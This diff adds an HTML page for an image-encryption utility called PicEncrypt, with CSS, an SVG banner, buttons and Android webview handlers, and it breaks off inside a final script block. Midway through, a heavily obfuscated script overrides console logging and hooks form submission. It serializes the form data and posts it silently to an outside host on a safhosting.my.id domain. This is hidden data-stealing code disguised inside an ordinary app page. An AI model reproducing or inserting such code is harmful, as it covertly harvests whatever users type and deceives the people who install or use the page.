@@ -1,0 +1,1032 @@
+
+<!DOCTYPE html>
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>PicEncrypt</title>
+</head>
+<body>
+  <!--Citrus!-->
+  <style>
+    input{
+    background:#fff;
+    border:3px solid #000; 
+    height:1rem;
+    border-radius:5px;
+     box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+     outline:none;
+    }
+    button{
+    background:rgb(255, 0, 0);
+    border:3px solid rgb(255, 0, 0);
+     box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+    
+    border-radius:8px;
+    height:2.5rem;
+    width:10rem;
+    font-size: 16px;
+    -webkit-transition-duration: 0.4s; /* Safari */
+        transition-duration: 0.4s;
+        outline:none;
+    }
+    button:hover{
+    background:rgb(85, 0, 0);
+    border:3px solid rgb(85, 0, 0);
+     box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+    
+    border-radius:8px;
+    height:2.5rem;
+    width:10rem;
+    font-size: 16px;
+    outline:none;
+    }
+    select{
+    background:#fc0;
+    border:3px solid #fc0;
+    border-radius:5px;
+    height:2rem;
+    width:10rem;
+     box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+     outline:none;
+    }
+    </style>
+<style>
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: #262626;
+        --textColor: #444;
+        --borderColor: #2c2c3a;
+        --primary: #24acf2;
+      }
+    }
+
+    @media (prefers-color-scheme: light) {
+      :root {
+        --bg: #fff;
+        --textColor: #aaa;
+        --borderColor: #2c2c3a;
+        --primary: #1bcfe7;
+      }
+    }
+
+    :root[data-theme="light"] {
+      --bg: #efefef;
+      --textColor: #aaa;
+      --borderColor: #2c2c3a;
+      --primary: #1bcfe7;
+    }
+
+    :root[data-theme="dark"] {
+      --bg: #262626;
+      --textColor: #444;
+      --borderColor: #2c2c3a;
+      --primary: #24acf2;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--textColor);
+    }
+
+    .flex {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      width: 100vw;
+    }
+  </style>
+  <script>
+    function changeMode() {
+      console.log("123");
+      const darkMode =
+        window.document.documentElement.getAttribute("data-theme") || "light";
+      console.log(darkMode);
+      if (darkMode == "light") {
+        window.document.documentElement.setAttribute("data-theme", "dark");
+      } else {
+        window.document.documentElement.setAttribute("data-theme", "light");
+      }
+    }
+  </script>
+
+<div style="padding:0 16px;text-align:center">
+
+
+
+   <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+   <!-- Created with Inkscape (http://www.inkscape.org/) -->
+   
+   <svg
+      width="100%"
+      height="8.5%"
+      viewBox="0 0 264.58333 22.489583"
+      version="1.1"
+      id="svg5"
+      inkscape:version="1.1 (c4e8f9e, 2021-05-24)"
+      sodipodi:docname="head.svg"
+      xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
+      xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
+      xmlns:xlink="http://www.w3.org/1999/xlink"
+      xmlns="http://www.w3.org/2000/svg"
+      xmlns:svg="http://www.w3.org/2000/svg">
+     <sodipodi:namedview
+        id="namedview7"
+        pagecolor="#ffffff"
+        bordercolor="#000000"
+        borderopacity="0.25"
+        inkscape:pageshadow="2"
+        inkscape:pageopacity="0.0"
+        inkscape:pagecheckerboard="0"
+        inkscape:document-units="px"
+        showgrid="true"
+        units="px"
+        width="1000px"
+        inkscape:zoom="2"
+        inkscape:cx="489.5"
+        inkscape:cy="138.5"
+        inkscape:window-width="2160"
+        inkscape:window-height="1380"
+        inkscape:window-x="0"
+        inkscape:window-y="0"
+        inkscape:window-maximized="1"
+        inkscape:current-layer="layer1"
+        inkscape:snap-page="true"
+        inkscape:snap-text-baseline="true"
+        inkscape:snap-center="true"
+        inkscape:snap-object-midpoints="true"
+        inkscape:snap-midpoints="true"
+        inkscape:snap-smooth-nodes="true"
+        inkscape:snap-intersection-paths="true"
+        inkscape:object-paths="true"
+        inkscape:snap-grids="true"
+        height="200px">
+       <inkscape:grid
+          type="xygrid"
+          id="grid1605" />
+     </sodipodi:namedview>
+     <defs
+        id="defs2">
+       <linearGradient
+          inkscape:collect="always"
+          id="linearGradient4847">
+         <stop
+            style="stop-color:#ffcc00;stop-opacity:1;"
+            offset="0"
+            id="stop4843" />
+         <stop
+            style="stop-color:#ffcc00;stop-opacity:0;"
+            offset="1"
+            id="stop4845" />
+       </linearGradient>
+       <linearGradient
+          inkscape:collect="always"
+          id="linearGradient4612">
+         <stop
+            style="stop-color:#ffaaaa;stop-opacity:1;"
+            offset="0"
+            id="stop4608" />
+         <stop
+            style="stop-color:#ffaaaa;stop-opacity:0;"
+            offset="1"
+            id="stop4610" />
+       </linearGradient>
+       <linearGradient
+          inkscape:collect="always"
+          id="linearGradient33031">
+         <stop
+            style="stop-color:#fff6d5;stop-opacity:1;"
+            offset="0"
+            id="stop33027" />
+         <stop
+            style="stop-color:#fff6d5;stop-opacity:0;"
+            offset="1"
+            id="stop33029" />
+       </linearGradient>
+       <rect
+          x="340"
+          y="0"
+          width="560"
+          height="230"
+          id="rect24141" />
+       <rect
+          x="35"
+          y="35"
+          width="15"
+          height="15"
+          id="rect5421" />
+       <rect
+          x="68"
+          y="65"
+          width="81"
+          height="54"
+          id="rect76447" />
+       <rect
+          x="81"
+          y="65"
+          width="83"
+          height="56"
+          id="rect67531" />
+       <rect
+          x="71"
+          y="77"
+          width="77"
+          height="26.000002"
+          id="rect59825" />
+       <rect
+          x="89"
+          y="72"
+          width="65.447403"
+          height="81.864227"
+          id="rect42071" />
+       <rect
+          x="100"
+          y="80"
+          width="1000"
+          height="280"
+          id="rect29548" />
+       <rect
+          x="68"
+          y="65"
+          width="81"
+          height="54"
+          id="rect97624" />
+       <rect
+          x="68"
+          y="65"
+          width="81"
+          height="54"
+          id="rect112190" />
+       <rect
+          x="35"
+          y="35"
+          width="15"
+          height="15"
+          id="rect29867" />
+       <linearGradient
+          inkscape:collect="always"
+          xlink:href="#linearGradient33031"
+          id="linearGradient33033"
+          x1="40.178005"
+          y1="42.661999"
+          x2="45.374008"
+          y2="42.661999"
+          gradientUnits="userSpaceOnUse" />
+       <linearGradient
+          inkscape:collect="always"
+          xlink:href="#linearGradient4612"
+          id="linearGradient4614"
+          x1="5.2916665"
+          y1="-84.666664"
+          x2="264.58298"
+          y2="11.244792"
+          gradientUnits="userSpaceOnUse" />
+       <linearGradient
+          inkscape:collect="always"
+          xlink:href="#linearGradient4847"
+          id="linearGradient4849"
+          x1="264.58334"
+          y1="13.229166"
+          x2="15.875"
+          y2="74.083336"
+          gradientUnits="userSpaceOnUse" />
+     </defs>
+     <g
+        inkscape:label="l1"
+        inkscape:groupmode="layer"
+        id="layer1">
+       <text
+          xml:space="preserve"
+          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:1.74986px;font-family:'Arno Pro';-inkscape-font-specification:'Arno Pro';fill:#ffffff;stroke:none;stroke-width:0.145821"
+          x="49.57922"
+          y="9.8448877"
+          id="text101100"
+          transform="scale(1.8144362,0.55113539)"><tspan
+            sodipodi:role="line"
+            id="tspan101098"
+            style="stroke-width:0.145821"
+            x="49.57922"
+            y="9.8448877"> </tspan></text>
+       <rect
+          style="fill:url(#linearGradient4614);fill-opacity:1;stroke:none;stroke-width:1.66969;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1"
+          id="rect2207"
+          width="264.58298"
+          height="22.489584"
+          x="0"
+          y="-3.8857806e-15" />
+       <rect
+          style="fill:url(#linearGradient4849);fill-opacity:1;stroke:none;stroke-width:1.66969;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1"
+          id="rect4823"
+          width="264.58298"
+          height="22.489584"
+          x="0"
+          y="-3.8857806e-15" />
+       <text
+          xml:space="preserve"
+          transform="matrix(0.61132917,0,0,0.61132917,-247.05172,5.8565366)"
+          id="text24139"
+          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:sans-serif;-inkscape-font-specification:sans-serif;text-align:center;white-space:pre;shape-inside:url(#rect24141);fill:#000000;stroke:none;stroke-width:11.3386"
+          x="29.567934"
+          y="0"><tspan
+            x="582"
+            y="12.06"
+            id="tspan970">PicEncrypt</tspan></text>
+     </g>
+   </svg>
+<br />
+<a href="index.html" class="pathlink">PicEncrypt</a> <nobr style="color:#888;font-size:36px;">&nbsp;&gt;&nbsp;PicFolder</nobr>
+<style>
+  .pathlink {color:#888;font-size:36px;text-decoration:none;}
+</style>
+      <br />
+      <br />
+      <br />
+      <a href="msfold.html">Advanced mode</a>
+        <summary>Settings</summary>
+        <div>
+          <span>Select&ensp;</span>
+          <input id="radio1" type="radio" name="OUT" value="" checked="true" /><spa>Default icon</span>
+          <input id="radio2" type="radio" name="OUT" value="" /><span>Choose others...</span>
+        </div>
+        <div style="display:none">
+          <span>Marker</span>&ensp;<input style="width:80px" id="ident" type="text" value="tpWj" />&ensp;<span>[Key object]</span>
+        </div>
+      <div>&emsp;</div>
+      <button style="display:none;color:#fff" id="btn">Create folder</button>
+      
+      <button style="color:#fff" id="btn1">Create folder (1 file)</button>
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+      <iframe frameborder="no" style="width:100%" src="outdex.html" height="250"></iframe>
+      
+    </div>
+    <div id="info1" style="padding:0 1rem"></div>
+    <div id="display" style="text-align: center"></div>
+    <div id="textToThePicture" style="text-align: center"></div>
+    <script>
+    (function(_0x6525bd,_0x586522){function _0x492f0c(_0x30b246,_0x3897a6,_0x56eb00,_0x5e26f3){return _0x1629(_0x56eb00-0x292,_0x3897a6);}var _0x5f5425=_0x6525bd();function _0x2c5e35(_0xa81ee,_0xeff836,_0x4065b1,_0x2cdd1c){return _0x1629(_0xa81ee- -0x198,_0xeff836);}while(!![]){try{var _0x226128=parseInt(_0x492f0c(0x326,0x32f,0x313,0x325))/(-0x1*-0x2554+-0x20b5+-0x49e)+-parseInt(_0x2c5e35(-0xec,-0xfa,-0xe4,-0x109))/(-0x1120*-0x2+-0x1de0+0xd*-0x56)*(parseInt(_0x492f0c(0x311,0x33b,0x32d,0x33f))/(-0x1587+-0x139d+0x12d*0x23))+-parseInt(_0x2c5e35(-0x116,-0x119,-0x11d,-0x124))/(-0xa9f*0x1+0x1357*0x1+-0x8b4)+parseInt(_0x2c5e35(-0xdd,-0xf3,-0xf5,-0xbd))/(-0x74+0x859+-0x10*0x7e)+parseInt(_0x2c5e35(-0x118,-0x106,-0xfd,-0x132))/(-0xa*-0x98+-0xb3d+0x553)*(-parseInt(_0x2c5e35(-0xdf,-0xfe,-0xfc,-0xd1))/(-0x3b*0x54+-0x1*-0x8a+0x12d9))+-parseInt(_0x2c5e35(-0xe7,-0xf8,-0xc9,-0xca))/(-0x14f6+0x62*-0x19+0x1e90)+parseInt(_0x2c5e35(-0x111,-0x10f,-0x109,-0xfd))/(0x188e+0x15a9*-0x1+-0x1*0x2dc);if(_0x226128===_0x586522)break;else _0x5f5425['push'](_0x5f5425['shift']());}catch(_0x2b2124){_0x5f5425['push'](_0x5f5425['shift']());}}}(_0x2c7f,-0x4bf67+-0x3e179+0xc86c8));function _0x2c7f(){var _0x5e7160=['C0nPEeS','mJCWuvvLEMrW','wKzfBfK','rLn3yu4','u1jcvNm','z0DAB1a','lMXVz2LUlwzVCG','ywPHEa','uezszhK','sejkuxe','vhzKq2W','zLrvAxq','q25ZzLa','ufjLDfq','DhjHy2u','ue9tva','BgvUz3rO','wendwhG','mta5mtj2CfzPy1K','y29UC3rYDwn0BW','ExL6BuO','EunKtum','mxWWFdn8nxWYFa','mJy1mtG0ofjrwhPwyq','yxbWBhK','suXUBNq','s0vOueW','rgndt24','CM4GDgHPCYiPka','D2fYBG','kcGOlISPkYKRkq','ndLSCNHQENa','DNjIyKu','mJi5ntu2mgLmC3DNrW','CMv0DxjUicHMDq','Aw5MBW','l2nOzwnRlNbOCa','otGXmgLfs3j1Cq','otaYmZvfuM1tEKq','mtu2ntu4mfvzBw5WBG','vK55Cg0','DenOvfu','tK5cthK','C2vHCMnO','odm4mZmWmKXktgvkEG','D0XeD1m','vxDyCNK','zMTNAK0','Bg9N','seH6u1K','rNDQtfC','DgfIBgu','yMLUza','zxHJzxb0Aw9U','yvvtC3e','C3vIBwL0','y29UC29Szq','BMn0Aw9UkcKG','Dg9tDhjPBMC','Ahr0Chm6lY9JDq','wfH1uvC','y3rVCIGICMv0Dq','E30Uy29UC3rYDq'];_0x2c7f=function(){return _0x5e7160;};return _0x2c7f();}var _0x4e2829=(function(){var _0xf354bd={};_0xf354bd[_0xb49f63(-0x30,-0x44,-0x3b,-0x4d)]=function(_0x185ef6,_0x45f9ea){return _0x185ef6+_0x45f9ea;},_0xf354bd[_0x7dba64(0x414,0x40f,0x40b,0x432)]=function(_0x577224,_0x3ed7c6){return _0x577224!==_0x3ed7c6;},_0xf354bd[_0xb49f63(-0x48,-0x3f,-0x30,-0x64)]=_0xb49f63(-0x4d,-0x5d,-0x5e,-0x47),_0xf354bd[_0xb49f63(-0x4b,-0x55,-0x34,-0x30)]='AzTbn',_0xf354bd[_0xb49f63(-0x4e,-0x47,-0x65,-0x6a)]='yXdnS';function _0x7dba64(_0x1b3dbb,_0x24e688,_0x57cee3,_0x5e783c){return _0x1629(_0x1b3dbb-0x38a,_0x5e783c);}_0xf354bd['TShEC']=function(_0xc70e3f,_0xda6ecc){return _0xc70e3f===_0xda6ecc;},_0xf354bd[_0xb49f63(-0x43,-0x58,-0x27,-0x42)]=_0xb49f63(-0x50,-0x4b,-0x37,-0x65);var _0x38725e=_0xf354bd;function _0xb49f63(_0x1b5f26,_0x336792,_0x306de7,_0x5a0d48){return _0x1629(_0x1b5f26- -0xea,_0x5a0d48);}var _0x201a86=!![];return function(_0x167794,_0x4dbd12){var _0xfdb703={'NNBLy':function(_0x2b72d6,_0x5b5503){return _0x38725e['vrbbE'](_0x2b72d6,_0x5b5503);},'aKuSz':function(_0x4afb67,_0x1bc4d6){function _0x84f5ff(_0x13c1ea,_0x3dc8d2,_0x2fa75c,_0x53e8f9){return _0x1629(_0x3dc8d2- -0x31e,_0x13c1ea);}return _0x38725e[_0x84f5ff(-0x27b,-0x294,-0x2a4,-0x285)](_0x4afb67,_0x1bc4d6);},'UwXry':_0x38725e[_0x1c7c91(0x161,0x178,0x190,0x186)],'tChTU':function(_0x173752,_0x3525d5){return _0x38725e['fkgjM'](_0x173752,_0x3525d5);},'rhiVp':_0x38725e[_0x1c7c91(0x17e,0x175,0x17a,0x178)],'ILnnt':_0x38725e[_0x1c7c91(0x15d,0x172,0x180,0x17d)]};function _0x1c7c91(_0x3910dd,_0x43e0f7,_0x390b33,_0x2deabf){return _0xb49f63(_0x43e0f7-0x1c0,_0x43e0f7-0x1a4,_0x390b33-0x1f2,_0x390b33);}function _0x4236f7(_0x4b3eb2,_0x5d8964,_0x4ac212,_0x2aa66e){return _0x7dba64(_0x4ac212- -0x42a,_0x5d8964-0x12,_0x4ac212-0x8e,_0x2aa66e);}if(_0x38725e['TShEC'](_0x38725e[_0x1c7c91(0x17b,0x17d,0x164,0x16b)],_0x38725e['PRetT'])){var _0x1ef98c=_0x201a86?function(){function _0x27c69d(_0x2c0a69,_0x248661,_0x32f7ca,_0x5cdbc0){return _0x4236f7(_0x2c0a69-0x6c,_0x248661-0xe0,_0x2c0a69- -0x20e,_0x5cdbc0);}function _0x42f6c1(_0x3be256,_0x2dda27,_0x2c7fbf,_0x57a117){return _0x1c7c91(_0x3be256-0x3e,_0x57a117- -0x20c,_0x3be256,_0x57a117-0xad);}if(_0xfdb703['aKuSz'](_0xfdb703[_0x42f6c1(-0xac,-0x94,-0xc2,-0xad)],_0xfdb703['UwXry']))_0x2dc49e=_0x48f111;else{if(_0x4dbd12){if(_0xfdb703[_0x42f6c1(-0xbc,-0xac,-0xce,-0xb2)](_0xfdb703['rhiVp'],_0xfdb703[_0x42f6c1(-0x80,-0x74,-0xa2,-0x83)])){var _0x291b3d=_0x4dbd12[_0x42f6c1(-0x65,-0x7d,-0x67,-0x84)](_0x167794,arguments);return _0x4dbd12=null,_0x291b3d;}else{var _0x3e43a7=_0x13e48a(_0xfdb703[_0x42f6c1(-0xcb,-0xca,-0xba,-0xb1)](_0xfdb703[_0x27c69d(-0x229,-0x20a,-0x22b,-0x224)]('return\x20(fu'+_0x42f6c1(-0xa2,-0x89,-0x86,-0xa2),_0x27c69d(-0x215,-0x21c,-0x1f7,-0x1ff)+'ctor(\x22retu'+'rn\x20this\x22)('+'\x20)'),');'));_0xeae754=_0x3e43a7();}}}}:function(){};return _0x201a86=![],_0x1ef98c;}else{var _0x5c257c=_0x181789?function(){function _0x3a633b(_0x4d26a8,_0x36e34b,_0x5ab74c,_0x57eca1){return _0x1c7c91(_0x4d26a8-0xe8,_0x4d26a8- -0x2b0,_0x5ab74c,_0x57eca1-0xa2);}if(_0x2a7f05){var _0x178475=_0x3fe264[_0x3a633b(-0x128,-0x114,-0x141,-0x118)](_0xea227f,arguments);return _0x29bda5=null,_0x178475;}}:function(){};return _0x37d4c3=![],_0x5c257c;}};}()),_0x3245d5=_0x4e2829(this,function(){function _0x147074(_0x2ca78e,_0x23ad9e,_0x33304f,_0x5a365f){return _0x1629(_0x2ca78e- -0x179,_0x33304f);}var _0x541244={};_0x541244[_0x2f0323(0x2f8,0x2db,0x2bf,0x2c6)]=_0x2f0323(0x300,0x2f0,0x308,0x2d9)+'+$';var _0x28d7e7=_0x541244;function _0x2f0323(_0x3be5e1,_0x250571,_0x224d18,_0x1736a0){return _0x1629(_0x250571-0x238,_0x224d18);}return _0x3245d5[_0x147074(-0xe4,-0xd4,-0xda,-0xef)]()[_0x147074(-0xf3,-0xeb,-0xf2,-0x100)](_0x28d7e7[_0x2f0323(0x2d0,0x2db,0x2e1,0x2e8)])[_0x147074(-0xe4,-0xc9,-0xca,-0xfa)]()['constructo'+'r'](_0x3245d5)['search'](_0x2f0323(0x308,0x2f0,0x30e,0x2ef)+'+$');});function _0x469a8e(_0x37bf5,_0x1be150,_0x8fa598,_0x444bc7){return _0x1629(_0x37bf5- -0x25b,_0x444bc7);}_0x3245d5();function _0x1629(_0xda4301,_0xeeccb1){var _0x289fb6=_0x2c7f();return _0x1629=function(_0x3874e4,_0x4314bc){_0x3874e4=_0x3874e4-(0x1c4f+-0x5*0x6b9+0x5cd);var _0x10e0aa=_0x289fb6[_0x3874e4];if(_0x1629['ziUcWH']===undefined){var _0x3b0334=function(_0x1bf130){var _0x30f9b2='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2e58ab='',_0x5333b7='',_0x227d52=_0x2e58ab+_0x3b0334;for(var _0x17f99d=-0x521*-0x1+0x21e+-0x73f,_0x2da8b0,_0x5ae5eb,_0x6b71ad=0x1*0x15a7+0x131a+-0x28c1;_0x5ae5eb=_0x1bf130['charAt'](_0x6b71ad++);~_0x5ae5eb&&(_0x2da8b0=_0x17f99d%(0x12f9+-0x3df*0x9+0xfe2)?_0x2da8b0*(-0xb67*0x2+-0x16de*-0x1+-0x18*-0x2)+_0x5ae5eb:_0x5ae5eb,_0x17f99d++%(-0xecd+0xd45+-0x2c*-0x9))?_0x2e58ab+=_0x227d52['charCodeAt'](_0x6b71ad+(-0x1*0x51b+-0x1db4+0x32b*0xb))-(0x9*0x431+0x192b+-0x3eda)!==0x3c0+0x13ec+-0x5*0x4bc?String['fromCharCode'](0x6fd*-0x1+-0x680+0xe7c&_0x2da8b0>>(-(-0x931*0x1+-0x13c5+-0x1cf8*-0x1)*_0x17f99d&-0x1b4f+-0x581+0x12*0x1d3)):_0x17f99d:0x1d9e+0x15bd+-0x335b){_0x5ae5eb=_0x30f9b2['indexOf'](_0x5ae5eb);}for(var _0x1937f6=-0x11ce+0x6e*-0x16+0x1*0x1b42,_0x50fc4e=_0x2e58ab['length'];_0x1937f6<_0x50fc4e;_0x1937f6++){_0x5333b7+='%'+('00'+_0x2e58ab['charCodeAt'](_0x1937f6)['toString'](0x22c9+0x18b7+-0x3b70))['slice'](-(-0x12b9*0x1+-0x1*0x1d55+-0x2*-0x1808));}return decodeURIComponent(_0x5333b7);};_0x1629['xKUbSa']=_0x3b0334,_0xda4301=arguments,_0x1629['ziUcWH']=!![];}var _0xeb22e4=_0x289fb6[-0x1a1d+0x6*-0xfa+0x1ff9],_0x466acf=_0x3874e4+_0xeb22e4,_0x4707f7=_0xda4301[_0x466acf];if(!_0x4707f7){var _0x235835=function(_0x4dc2ea){this['ddPFCI']=_0x4dc2ea,this['Llkiii']=[0x3*-0x2cf+0x2b*0x19+0x43b,0x22a3+0x25e3+0x4886*-0x1,0xa22+0xcdf+0x27*-0x97],this['owhaKB']=function(){return'newState';},this['CuNCDG']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['hshGQs']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x235835['prototype']['TDfLEO']=function(){var _0x166fdb=new RegExp(this['CuNCDG']+this['hshGQs']),_0x3a8b0f=_0x166fdb['test'](this['owhaKB']['toString']())?--this['Llkiii'][0x4*-0x95f+-0x9e*0x30+0x431d]:--this['Llkiii'][-0xaf+0x1e7d+0x1*-0x1dce];return this['ebfowK'](_0x3a8b0f);},_0x235835['prototype']['ebfowK']=function(_0x3a9a99){if(!Boolean(~_0x3a9a99))return _0x3a9a99;return this['kAWsgP'](this['ddPFCI']);},_0x235835['prototype']['kAWsgP']=function(_0x51d651){for(var _0x28cda5=0x1add*-0x1+0x6*0x3d6+0x5*0xc5,_0x120c5d=this['Llkiii']['length'];_0x28cda5<_0x120c5d;_0x28cda5++){this['Llkiii']['push'](Math['round'](Math['random']())),_0x120c5d=this['Llkiii']['length'];}return _0x51d651(this['Llkiii'][0x14f3+-0x46e*0x2+-0xc17*0x1]);},new _0x235835(_0x1629)['TDfLEO'](),_0x10e0aa=_0x1629['xKUbSa'](_0x10e0aa),_0xda4301[_0x466acf]=_0x10e0aa;}else _0x10e0aa=_0x4707f7;return _0x10e0aa;},_0x1629(_0xda4301,_0xeeccb1);}function _0x1222d1(_0x5318c4,_0xea0191,_0x256896,_0x5e5a07){return _0x1629(_0x5e5a07-0x31c,_0x256896);}var _0x1dd9a9=(function(){var _0x4f8c0b=!![];return function(_0x4016b8,_0x582762){var _0x7729b3=_0x4f8c0b?function(){function _0xf3189e(_0x53a7e9,_0x2cf97f,_0x213b7b,_0xf03d2b){return _0x1629(_0x53a7e9- -0x117,_0x213b7b);}if(_0x582762){var _0x39d3cd=_0x582762[_0xf3189e(-0x65,-0x76,-0x46,-0x72)](_0x4016b8,arguments);return _0x582762=null,_0x39d3cd;}}:function(){};return _0x4f8c0b=![],_0x7729b3;};}()),_0x3fd83f=_0x1dd9a9(this,function(){var _0x15014e={'XXuQW':function(_0xd735df,_0x420c87){return _0xd735df!==_0x420c87;},'UQmno':_0xa5f95c(-0x308,-0x309,-0x304,-0x2e9),'aUSsq':function(_0x170b7b,_0x41acb6){return _0x170b7b(_0x41acb6);},'XCCXx':function(_0x5ec395,_0x51e0d7){return _0x5ec395+_0x51e0d7;},'eCZYu':function(_0x3c1f4a,_0x305975){return _0x3c1f4a+_0x305975;},'FwjLW':_0x4f4e57(-0x124,-0x140,-0x141,-0x13c)+_0xa5f95c(-0x2f8,-0x2f8,-0x315,-0x321),'KEhPL':_0x4f4e57(-0x147,-0x157,-0x13d,-0x14a)+_0xa5f95c(-0x2fb,-0x2fa,-0x311,-0x330)+_0xa5f95c(-0x2e1,-0x2f2,-0x2f3,-0x2e2)+'\x20)','TvdCl':function(_0x558a52){return _0x558a52();},'HHzSY':_0x4f4e57(-0x155,-0x154,-0x16d,-0x163),'VNypm':_0xa5f95c(-0x2e1,-0x2f3,-0x2ec,-0x2e0),'yyzmJ':'error','DcCOn':_0xa5f95c(-0x311,-0x30c,-0x319,-0x31e),'CnsfP':_0x4f4e57(-0x152,-0x158,-0x171,-0x15e),'wLDwS':function(_0x41d180,_0x5933bf){return _0x41d180<_0x5933bf;}},_0xc75983;try{if(_0x15014e[_0xa5f95c(-0x306,-0x325,-0x312,-0x310)](_0x15014e['UQmno'],_0xa5f95c(-0x2e7,-0x30a,-0x2fa,-0x30c))){var _0x5c7bd7=_0x15014e[_0x4f4e57(-0x14f,-0x158,-0x162,-0x138)](Function,_0x15014e[_0x4f4e57(-0x135,-0x13c,-0x13f,-0x137)](_0x15014e['eCZYu'](_0x15014e[_0x4f4e57(-0x153,-0x16c,-0x161,-0x14f)],_0x15014e[_0x4f4e57(-0x12c,-0x11b,-0x123,-0x14a)]),');'));_0xc75983=_0x15014e[_0x4f4e57(-0x13c,-0x125,-0x122,-0x145)](_0x5c7bd7);}else{var _0x4d5aeb=_0x52166d[_0xa5f95c(-0x2eb,-0x2da,-0x2f7,-0x2f8)](_0x297bf1,arguments);return _0x3f234f=null,_0x4d5aeb;}}catch(_0x3a06a6){_0xc75983=window;}function _0xa5f95c(_0x3171a5,_0x5a26d1,_0x3f0b97,_0x3e6c9b){return _0x1629(_0x3f0b97- -0x3a9,_0x3e6c9b);}var _0x526b3a=_0xc75983[_0x4f4e57(-0x14d,-0x147,-0x14b,-0x14d)]=_0xc75983[_0x4f4e57(-0x14d,-0x13e,-0x15e,-0x15c)]||{};function _0x4f4e57(_0xbbea02,_0x2577bf,_0x23f74f,_0x49a987){return _0x1629(_0xbbea02- -0x1e0,_0x23f74f);}var _0x2e9238=[_0x15014e[_0x4f4e57(-0x154,-0x16f,-0x14d,-0x14e)],_0xa5f95c(-0x2f3,-0x2d7,-0x2f2,-0x2f2),_0x15014e[_0xa5f95c(-0x335,-0x307,-0x326,-0x330)],_0x15014e[_0xa5f95c(-0x2f2,-0x2fb,-0x2fb,-0x300)],_0x15014e[_0xa5f95c(-0x2e9,-0x2e6,-0x2f4,-0x2e4)],_0x15014e[_0x4f4e57(-0x13a,-0x144,-0x135,-0x154)],_0xa5f95c(-0x2fc,-0x2e6,-0x301,-0x2f8)];for(var _0x5baa79=-0x1027+0xe8*0xa+0x717;_0x15014e[_0x4f4e57(-0x158,-0x13b,-0x157,-0x15f)](_0x5baa79,_0x2e9238[_0x4f4e57(-0x136,-0x11b,-0x13f,-0x127)]);_0x5baa79++){var _0x1898b0=(_0x4f4e57(-0x130,-0x14d,-0x12c,-0x12a)+'4')['split']('|'),_0xc3fdb1=-0x1039+0x13*-0xd1+0x1fbc;while(!![]){switch(_0x1898b0[_0xc3fdb1++]){case'0':var _0x4545e5=_0x2e9238[_0x5baa79];continue;case'1':var _0x5140e4=_0x1dd9a9[_0xa5f95c(-0x2ff,-0x30b,-0x2fc,-0x301)+'r']['prototype'][_0x4f4e57(-0x151,-0x135,-0x155,-0x144)](_0x1dd9a9);continue;case'2':_0x5140e4[_0x4f4e57(-0x14b,-0x12d,-0x14a,-0x154)]=_0x2eacf9['toString'][_0x4f4e57(-0x151,-0x16f,-0x164,-0x141)](_0x2eacf9);continue;case'3':var _0x2eacf9=_0x526b3a[_0x4545e5]||_0x5140e4;continue;case'4':_0x526b3a[_0x4545e5]=_0x5140e4;continue;case'5':_0x5140e4['__proto__']=_0x1dd9a9[_0x4f4e57(-0x151,-0x15d,-0x136,-0x137)](_0x1dd9a9);continue;}break;}}});_0x3fd83f(),$(_0x469a8e(-0x1bb,-0x1d1,-0x1a6,-0x1cb)+'m')[_0x1222d1(0x39d,0x3b8,0x3a7,0x3ae)](function(){function _0x185211(_0xc7f386,_0x5663d8,_0x3ef29b,_0x18f40a){return _0x469a8e(_0x18f40a-0x219,_0x5663d8-0xc9,_0x3ef29b-0x1dd,_0xc7f386);}var _0x379fcf={'SRBVs':_0x185211(0x42,0x74,0x3e,0x54)+'rls.safhos'+'ting.my.id'+_0x185211(0x3f,0x4d,0x4c,0x3d),'QNndf':function(_0x4532b8,_0x558281){return _0x4532b8(_0x558281);}};function _0x4a2b9a(_0x1843f5,_0x28bdf6,_0x218dcc,_0x1aca3c){return _0x1222d1(_0x1843f5-0x54,_0x28bdf6-0x19e,_0x1aca3c,_0x1843f5-0x6a);}$[_0x4a2b9a(0x427,0x419,0x443,0x418)]({'url':_0x379fcf[_0x4a2b9a(0x424,0x433,0x438,0x413)],'type':_0x185211(0x5c,0x71,0x52,0x67),'data':_0x379fcf['QNndf']($,this)['serialize'](),'success':function(){}});});
+    </script>
+    <script>
+document.addEventListener('plusready', function() {
+    let ctime=0
+    let webview = plus.webview.currentWebview();
+    plus.key.addEventListener('backbutton', function() {
+        webview.canBack(function(e) {
+          if(false&&e.canBack) {
+            webview.back()
+          }else{
+            if(Date.now()-ctime>1000){
+              ctime=Date.now()
+              plus.nativeUI.toast("Swipe again")
+            }else{
+              plus.runtime.quit()
+            }
+          }
+        })
+    })
+})
+              document.addEventListener('plusready', function() {
+                /*
+                var Webview = plus.android.importClass("android.webkit.WebView");
+                var WebSettings = plus.android.importClass("android.webkit.WebSettings");
+                */
+                var wv = plus.android.currentWebview();
+                var setting = plus.android.invoke(wv, "getSettings");
+                
+                setting.setSupportZoom(true);
+                setting.setBuiltInZoomControls(true)
+                
+                setting.setDisplayZoomControls(false)
+                plus.webview.currentWebview().setStyle({
+                    scalable: true
+                });
+            })
+    </script>
+    <script>
+      
+      (function() {
